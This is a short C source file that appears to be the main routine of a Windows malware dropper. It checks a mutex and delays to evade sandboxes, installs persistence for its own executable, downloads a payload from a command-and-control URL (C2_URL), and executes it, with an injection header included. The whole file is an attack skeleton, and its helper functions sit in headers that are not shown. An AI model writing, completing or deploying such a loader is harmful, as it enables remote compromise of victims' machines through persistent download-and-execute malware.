#include "config.h"
#include <windows.h>
#include <stdio.h>
#include "evasion.h"
#include "persistence.h"
#include "network.h"
#include "injection.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    // 1. EVASION
/*
TODO: FIX RESOURCE CHECK
    if (!check_resources()) {
        return 0;
    }
*/  

    smart_delay();

    if (!check_mutex()) {
        return 0;
    }

    // 2. PERSISTENCE

    char my_path[MAX_PATH];
    GetModuleFileNameA(NULL, my_path, MAX_PATH);
    
    install_persistence(my_path);

    // 3. DOWNLOAD PAYLOAD

    SIZE_T payload_size = 0;
    
    char* payload = download_payload(C2_URL, &payload_size);

    if (payload == NULL) {
        return 0;
    }

    // 4. EXECUTE

    execute_payload(payload, payload_size);

    return 0;
}
